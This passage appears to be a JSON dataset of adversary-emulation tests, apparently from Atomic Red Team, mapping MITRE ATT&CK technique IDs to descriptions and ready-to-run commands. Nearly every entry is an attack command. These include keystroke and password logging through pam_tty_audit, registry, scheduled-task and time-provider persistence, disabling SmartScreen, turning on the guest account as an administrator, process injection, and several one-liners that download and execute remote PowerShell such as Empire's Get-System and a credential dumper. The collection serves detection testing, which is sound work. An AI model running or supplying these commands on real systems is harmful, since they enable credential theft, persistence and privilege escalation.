            "description": "Pluggable Access Module, which is present on all modern Linux systems, generally contains a library called pam_tty_audit.so which logs all keystrokes for the selected users and sends it to audit.log.  All terminal activity on any new logins would then be archived and readable by an adversary with elevated privledges.\n\nPasswords hidden by the console can also be logged, with 'log_passwd' as in this example.  If root logging is enabled, then output from any process which is later started by root is also logged, even if this policy is carefully enabled (e.g. 'disable=*' as the initial command).\n\nUse 'aureport --tty' or other audit.d reading tools to read the log output, which is binary.  Mac OS does not currently contain the pam_tty_audit.so library. \n",
            "command": "if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk; sudo touch /tmp/system-auth.bk sudo echo \"session    required    pam_tty_audit.so; enable=* log_password\" >> /etc/pam.d/password-auth sudo echo \"session    required    pam_tty_audit.so; enable=* log_password\" >> /etc/pam.d/system-auth"
         },
         {
            "description": "Utilizes a swift script to log keys to sout. It runs for 5 seconds then dumps the output to standard. Input Monitoring is required.\nInput Monitoring can be enabled in System Preferences > Security & Privacy > Privacy > Input Monitoring.\nReferece: https://cedowens.medium.com/taking-esf-for-a-nother-spin-6e1e6acd1b74\n",
            "command": "swift 8495c4_MacOSKeylogger.swift -keylog"
         },
         {
            "description": "There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable and can be configured to write the latest \"bash history\" entries to the syslog.\n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n",
            "command": "PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t \"$USER[$$] $SSH_CONNECTION \")'; echo \"\\$PROMPT_COMMAND=$PROMPT_COMMAND\"; tail /var/log/syslog"
         }
      ]
   },
   "T1547.004": {
      "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
            "command": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, C:\\Windows\\System32\\cmd.exe\" -Force"
         },
         {
            "description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
            "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, C:\\Windows\\System32\\cmd.exe\" -Force"
         },
         {
            "description": "PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.\n\nUpon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon.\n\nPlease note that Winlogon Notifications have been removed as of Windows Vista / Windows Server 2008 and that this test thus only applies to erlier versions of Windows.\n",
            "command": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" -Force; Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"DllName\" \"C:\\Windows\\Temp\\atomicNotificationPackage.dll\" -Type ExpandString -Force; Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Logon\" \"AtomicTestFunction\" -Force; Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Impersonate\" 1 -Type DWord -Force; Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Asynchronous\" 0 -Type DWord -Force"
         },
         {
            "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
            "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, C:\\Windows\\System32\\cmd.exe\" -Force"
         },
         {
            "description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
            "command": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, C:\\Windows\\System32\\cmd.exe\" -Force"
         }
      ]
   },
   "T1053.005": {
      "technique_name": "Scheduled Task/Job: Scheduled Task",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Create a task on a remote system.\nUpon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.\n",
            "command": "SCHTASKS /Create /S localhost /RU DOMAIN\\user /RP At0micStrong /TN \"Atomic task\" /TR \"C:\\windows\\system32\\cmd.exe\" /SC daily /ST 20:10"
         },
         {
            "description": "Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.\n",
            "command": "$xml = [System.IO.File]::ReadAllText(\"2cc1c4_T1053_005_WMI.xml\"); Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }"
         },
         {
            "description": "Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.\n",
            "command": "SCHTASKS /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10"
         },
         {
            "description": "A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.\nThe scheduled task will launch powershell to decode and run the command in the registry daily.\nThis is a persistence mechanism recently seen in use by Qakbot.  \n\n[Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)\n",
            "command": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f && schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st 07:45"
         },
         {
            "description": "Create an atomic scheduled task that leverages native powershell cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.\n",
            "command": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"; $Trigger = New-ScheduledTaskTrigger -AtLogon; $User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest; $Set = New-ScheduledTaskSettingsSet; $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set; Register-ScheduledTask AtomicTask -InputObject $object"
         },
         {
            "description": "Create an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute. \nThis technique was seen several times in tricbot malware and also with the targetted attack campaigne the industroyer2.\n",
            "command": "$xml = [System.IO.File]::ReadAllText(\"54d4ab_T1053_05_SCTASK_HIDDEN_ATTRIB.xml\"); Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }"
         },
         {
            "description": "This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute \"notepad.exe\" within\n30 - 40 seconds after this module has run\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) ; Invoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Scheduler\""
         },
         {
            "description": "Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view\nthe tasks, open the Task Scheduler and look in the Active Tasks pane.\n",
            "command": "schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\" && schtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\""
         },
         {
            "description": "Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. \nIt will first be created to spawn cmd.exe, but modified to run notepad.exe.\n\nUpon successful execution, powershell.exe will create a scheduled task and modify the action. \n",
            "command": "$Action = New-ScheduledTaskAction -Execute \"cmd.exe\"; $Trigger = New-ScheduledTaskTrigger -AtLogon; $User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest; $Set = New-ScheduledTaskSettingsSet; $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set; Register-ScheduledTask AtomicTaskModifed -InputObject $object; $NewAction = New-ScheduledTaskAction -Execute \"Notepad.exe\"; Set-ScheduledTask \"AtomicTaskModifed\" -Action $NewAction"
         }
      ]
   },
   "T1055.002": {
      "technique_name": "Process Injection: Portable Executable Injection",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "This test injects a portable executable into a remote Notepad process memory using Portable Executable Injection and base-address relocation techniques. When successful, a message box will appear with the title \"Warning\" and the content \"Atomic Red Team\" after a few seconds.",
            "command": "Start-Process \"971b85_RedInjection.exe\"; Start-Sleep -Seconds 7; Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force"
         },
         {
            "description": "Leverage Mavinject (signed binary) for DLL injection",
            "command": "$explorer = Get-Process -Name explorer;\nmavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll\n"
         },
         {
            "description": "Injects sandcat DLL into an available process",
            "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"shared.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$PEBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}\n"
         },
         {
            "description": "Injects cred dumper exe into an available process",
            "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"file\",\"debugger.dll\");\n$PBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -PBytes $PBytes -verbose"
         }
      ]
   },
   "T1078.001": {
      "technique_name": "Valid Accounts: Default Accounts",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,\nand desktop will allow multiple RDP connections.\n",
            "command": "net user #{guest_user} /active:yes && net user #{guest_user} #{guest_password} && net localgroup #{local_admin_group} #{guest_user} /add && net localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /add && reg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f && reg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f"
         },
         {
            "description": "The Adversaries can activate the default Guest user. The guest account is inactivated by default\n",
            "command": "net user guest /active:yes"
         },
         {
            "description": "This test enables the guest account on macOS using sysadminctl utility.",
            "command": "sudo sysadminctl -guestAccount on"
         }
      ]
   },
   "T1484.001": {
      "technique_name": "Domain Policy Modification: Group Policy Modification",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "An adversary can modify the group policy settings.\n",
            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v EnableSmartScreen /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v ShellSmartScreenLevel /t REG_SZ /d Block /f"
         },
         {
            "description": "An adversary modifies group policy settings\n",
            "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force"
         }
      ]
   },
   "T1547.006": {
      "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "This test uses the insmod command to load a kernel module for Linux.\n",
            "command": "sudo insmod /tmp/T1547.006/T1547006.ko"
         },
         {
            "description": "This test uses the kextload and kmutil commands to load and unload a MacOS kernel module.\n",
            "command": "set -x; sudo kextload /Library/Extensions/SoftRAID.kext; kextstat 2>/dev/null | grep SoftRAID; sudo kextunload /Library/Extensions/SoftRAID.kext; sudo kmutil load -p /Library/Extensions/SoftRAID.kext; kextstat 2>/dev/null | grep SoftRAID; sudo kmutil unload -p /Library/Extensions/SoftRAID.kext"
         },
         {
            "description": "The following Atomic Test will write an file, comadmin.dat, to disk. From the report, Snake's installer drops the kernel driver and a custom DLL which is used to load the driver into a\nsingle AES encrypted file on disk. Typically, this file is named \u201ccomadmin.dat\u201d and is stored in the %windows%\\system32\\Com directory. \nThis Atomic Test will write a hardcoded named file to disk in the com directory named comadmin.dat.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n",
            "command": "$examplePath = Join-Path $env:windir \"system32\\Com\"; if (-not (Test-Path $examplePath)) { New-Item -ItemType Directory -Path $examplePath | Out-Null }; $exampleName = \"comadmin.dat\"; $exampleFullPath = Join-Path $examplePath $exampleName; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); [System.IO.File]::WriteAllBytes($exampleFullPath, $randomBytes)"
         },
         {
            "description": "This test uses the IOKit API to load a kernel module for macOS.\nHarcoded to use SoftRAID kext\n",
            "command": "sudo /tmp/T1547006_iokit_loader; kextstat 2>/dev/null | grep SoftRAID; sudo kextunload /Library/Extensions/SoftRAID.kext"
         }
      ]
   },
   "T1574.002": {
      "technique_name": "Hijack Execution Flow: DLL Side-Loading",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)\n",
            "command": "set DOTNET_STARTUP_HOOKS=\"80410d_preloader.dll\" && dotnet -h > nul && echo."
         },
         {
            "description": "GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.\nUpon execution, calc.exe will be opened.\n",
            "command": "\"67baa5_GUP.exe\""
         }
      ]
   },
   "T1546.007": {
      "technique_name": "Event Triggered Execution: Netsh Helper DLL",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "You can register a \"helper dll\" with Netsh as a persistance mechanism. The code in the dll is executed every time netsh.exe is called.\nThe NetshHelper.dll provided with the atomic will simply launch notepad when netsh.exe is run.\n\n[Blog](https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html)\n[Sample DLL code](https://github.com/outflanknl/NetshHelperBeacon)\n",
            "command": "netsh.exe add helper \"08497f_NetshHelper.dll\" && taskkill /im notepad.exe /t /f > NUL 2>&1"
         }
      ]
   },
   "T1134.001": {
      "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "https://github.com/BeichenDream/BadPotato\nPrivilege escalation using named pipe connections",
            "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"; Start-Process .\\BadPotato.exe notepad.exe; Start-Sleep -Second 20; Stop-Process -Name \"notepad\" -force -erroraction silentlycontinue; Stop-Process -Name \"BadPotato\" -force -erroraction silentlycontinue"
         },
         {
            "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).\n\nReference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose"
         },
         {
            "description": "Launches the NSudo executable for a short period of time and then exits.\nNSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.",
            "command": "Start-Process \"C:\\Users\\puma-4\\Desktop\\NSudoLG.exe\" -Argument \"-U:T -P:E cmd\"; Start-Sleep -Second 5; Stop-Process -Name \"cmd\" -force -erroraction silentlycontinue"
         },
         {
            "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose"
         }
      ]
   },
   "T1547.014": {
      "technique_name": "Active Setup",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "This test will add a StubPath entry to the Active Setup native registry key associated with 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) \nSaid key doesn't have a StubPath value by default, by adding one it will launch calc by forcing to run active setup using runonce.exe /AlternateShellStartup. \nWithout the last command it will normally run on next user logon. Note: this test will only run once successfully if no cleanup command is run in between test.\n",
            "command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" \"StubPath\" \"#{payload}\" -Force; & $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup"
         },
         {
            "description": "This test will decrease the version number of the 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) registry key for the current user, \nwhich will force the StubPath payload (if set) to execute.\n",
            "command": "Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Value \"0,0,0,0\"; & $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup"
         },
         {
            "description": "This test will create an \"atomic_test\" key under 'HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components' to launch calc by configuring an active setup executable and \nforcing to run active setup using the \"runonce.exe /AlternateShellStartup\" command. \nWithout the \"runonce.exe /AlternateShellStartup\" command it would run during the next logon for each user.\n\nNote: If you logout before running the cleanup command, you will be required to go through the OOBE (out-of-box experience) setup sequence to log back in. \nThe payload will only run once unless the cleanup command is run in between tests.\n\n[Active Setup Explained](https://helgeklein.com/blog/active-setup-explained/)\n",
            "command": "New-Item \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" -Name \"atomic_test\" -Force; Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"(Default)\" \"ART TEST\" -Force; Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"StubPath\" \"#{payload}\" -Force ; & $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup"
         }
      ]
   },
   "T1547.009": {
      "technique_name": "Boot or Logon Autostart Execution: Shortcut Modification",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "LNK file to launch CMD placed in startup folder. Upon execution, open File Explorer and browse to \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\nto view the new shortcut.\n",
            "command": "$Shell = New-Object -ComObject (\"WScript.Shell\"); $ShortCut = $Shell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\"); $ShortCut.TargetPath=\"cmd.exe\"; $ShortCut.WorkingDirectory = \"C:\\Windows\\System32\"; $ShortCut.WindowStyle = 1; $ShortCut.Description = \"T1547.009.\"; $ShortCut.Save(); $Shell = New-Object -ComObject (\"WScript.Shell\"); $ShortCut = $Shell.CreateShortcut(\"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\"); $ShortCut.TargetPath=\"cmd.exe\"; $ShortCut.WorkingDirectory = \"C:\\Windows\\System32\"; $ShortCut.WindowStyle = 1; $ShortCut.Description = \"T1547.009.\"; $ShortCut.Save()"
         },
         {
            "description": "This test to simulate shortcut modification and then execute. example shortcut (*.lnk , .url) strings check with powershell;\ngci -path \"C:\\Users\" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern \"exe\" | FL.\nUpon execution, calc.exe will be launched.\n",
            "command": "echo [InternetShortcut] > %temp%\\T1547.009_modified_shortcut.url && echo URL=C:\\windows\\system32\\calc.exe >> %temp%\\T1547.009_modified_shortcut.url && %temp%\\T1547.009_modified_shortcut.url"
         }
      ]
   },
   "T1546.011": {
      "technique_name": "Event Triggered Execution: Application Shimming",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Create registry keys in locations where fin7 typically places SDB patches. Upon execution, output will be displayed describing\nthe registry keys that were created. These keys can also be viewed using the Registry Editor.\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n",
            "command": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"; New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\""
         },
         {
            "description": "Install a shim database. This technique is used for privilege escalation and bypassing user access control.\nUpon execution, \"Installation of AtomicShim complete.\" will be displayed. To verify the shim behavior, run \nthe AtomicTest.exe from the <PathToAtomicsFolder>\\\\T1546.011\\\\bin directory. You should see a message box appear\nwith \"Atomic Shim DLL Test!\" as defined in the AtomicTest.dll. To better understand what is happening, review\nthe source code files is the <PathToAtomicsFolder>\\\\T1546.011\\\\src directory.\n",
            "command": "sdbinst.exe \"729b9b_AtomicShimx86.sdb\""
         },
         {
            "description": "Upon execution, check the \"C:\\Windows\\apppatch\\Custom\\\" folder for the new shim database\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n",
            "command": "Copy-Item \"C:\\Users\\puma-4\\Desktop\\T1546.011CompatDatabase.sdb\" C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb; Copy-Item \"C:\\Users\\puma-4\\Desktop\\T1546.011CompatDatabase.sdb\" C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb"
         }
      ]
   },
   "T1055.001": {
      "technique_name": "Process Injection: Dynamic-link Library Injection",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique via function of WinPwn",
            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')"
         },
         {
            "description": "Windows 10 Utility To Inject DLLS.\n\nUpon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.\nWith default arguments, expect to see a MessageBox, with notepad's icon in taskbar.\n",
            "command": "$mypid =; mavinject $mypid /INJECTRUNNING \"#{dll_payload}\"; Stop-Process -processname notepad"
         },
         {
            "description": "Leverage odbcconf for DLL injection",
            "command": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}\n"
         }
      ]
   },
   "T1547.003": {
      "technique_name": "Time Providers",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe new time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n",
            "command": "net stop w32time; Copy-Item \"C:\\Users\\puma-4\\Desktop\\T1547_003_AtomicTest.dll\" C:\\Users\\Public\\T1547_003_AtomicTest.dll; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\T1547_003_AtomicTest.dll\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f; net start w32time"
         },
         {
            "description": "Establishes persistence by editing the NtpServer time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n",
            "command": "net stop w32time; Copy-Item \"C:\\Users\\puma-4\\Desktop\\T1547_003_AtomicTest.dll\" C:\\Users\\Public\\T1547_003_AtomicTest.dll; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\T1547_003_AtomicTest.dll\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f; net start w32time"
         }
      ]
   },
   "T1547.010": {
      "technique_name": "Boot or Logon Autostart Execution: Port Monitors",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.",
            "command": "reg add \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\AtomicRedTeam\" /v \"Driver\" /d \"dba276_PortMonitor.dll\" /t REG_SZ /f"
         }
      ]
   },
   "T1546": {
      "technique_name": "Event Triggered Execution",
      "tactic": "multiple",
      "known implementations": [
         {
